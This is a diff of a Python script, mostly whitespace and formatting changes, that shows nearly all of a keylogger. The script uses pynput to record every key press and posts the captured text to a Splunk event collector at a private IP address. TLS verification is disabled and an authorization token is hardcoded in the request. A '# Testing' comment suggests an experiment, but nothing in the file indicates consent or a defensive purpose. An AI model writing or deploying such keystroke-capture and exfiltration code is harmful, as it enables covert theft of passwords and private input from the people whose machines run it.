@@ -5,15 +5,14 @@ import asyncio
 from markupsafe import escape
 from pynput import mouse, keyboard
 
-
-
 recording = []
 count = 0
 
+
 async def post_request():
     global recording
-    data=''.join(recording)
-    data="{{\"event\":\"word={0}\"}}".format(data)
+    data = ''.join(recording)
+    data = "{{\"event\":\"word={0}\"}}".format(data)
     # Testing
     url = "https://192.168.50.234:8088/services/collector/event"
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
@@ -22,11 +21,14 @@ async def post_request():
             data=data,
             headers={'Authorization': 'Splunk 24FD4388-F0DC-4036-A058-146DC4FA637B'})
 
+
 def get_key_code(key):
     if isinstance(key, keyboard.KeyCode):
         return f"{escape(key.char)}"
     else:
         return f" "
+
+
 def on_press(key):
     global recording, count
     recording.append(get_key_code(key))
@@ -40,8 +42,10 @@ def on_press(key):
         recording = []
     return False
 
+
 def on_release(key):
-   pass
+    pass
+
 
 def start_recording():
     keyboard_listener = keyboard.Listener(
@@ -52,4 +56,4 @@ def start_recording():
 
 
 while True:
-        start_recording()
+    start_recording()
